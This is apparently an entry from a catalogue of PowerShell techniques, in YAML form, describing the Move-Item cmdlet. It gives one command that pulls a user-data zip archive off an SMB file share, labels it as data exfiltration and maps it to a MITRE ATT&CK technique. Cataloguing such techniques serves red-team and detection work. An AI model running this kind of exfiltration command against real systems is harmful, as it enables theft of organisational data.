---
Name: Move-Item
Description: Moves an item from one location to another
Updated: 2023-07-01
Toolsets:
  - Builtin
  - PSSession
Commands:
  - Command: Move-Item -Path \\FS01.ad.bitsadmin.com\Users\AllUsers.zip .
    Description: Exfiltrate data
    Usecases:
      - Exfiltrate data over SMB
    Function: Data
    Comments:
      - 'Create PSSession `$ps` using [New-PSSession](../New-PSSession/)'
      - 'PowerShell Module: `Microsoft.PowerShell.Management`'
    MitreAttack:
      - T1021.002
Resources:
Detections:
Contributors:
    - Name: Arris Huijgen
      Handle: bitsadmin
---
